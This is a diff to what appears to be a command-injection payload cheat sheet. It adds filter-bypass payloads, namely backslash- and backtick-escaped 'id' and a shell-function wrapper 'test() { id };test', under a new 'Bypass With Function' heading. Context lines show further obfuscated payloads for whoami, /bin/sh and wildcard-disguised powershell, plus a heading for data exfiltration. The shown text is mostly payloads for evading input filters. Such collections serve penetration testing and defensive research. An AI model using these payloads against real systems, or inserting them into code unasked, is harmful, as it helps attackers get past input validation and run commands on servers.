@@ -26,6 +26,7 @@
     * [Bypass With $()](#bypass-with--1)
     * [Bypass With Variable Expansion](#bypass-with-variable-expansion)
     * [Bypass With Wildcards](#bypass-with-wildcards)
+    * [Bypass With Function](#bypass-with-function)
 * [Data Exfiltration](#data-exfiltration)
     * [Time Based Data Exfiltration](#time-based-data-exfiltration)
     * [Dns Based Data Exfiltration](#dns-based-data-exfiltration)
@@ -313,6 +314,8 @@ wh``oami
 ```powershell
 w\ho\am\i
 /\b\i\n/////s\h
+\id
+\``id`
 ```
 
 ### Bypass With $@
@@ -347,6 +350,12 @@ cat ${test//hh??hm/}
 ```powershell
 powershell C:\*\*2\n??e*d.*? # notepad
 @^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
+```
+
+### Bypass With Function
+
+```powershell
+test() { id };test
 ```
 
 ## Data Exfiltration
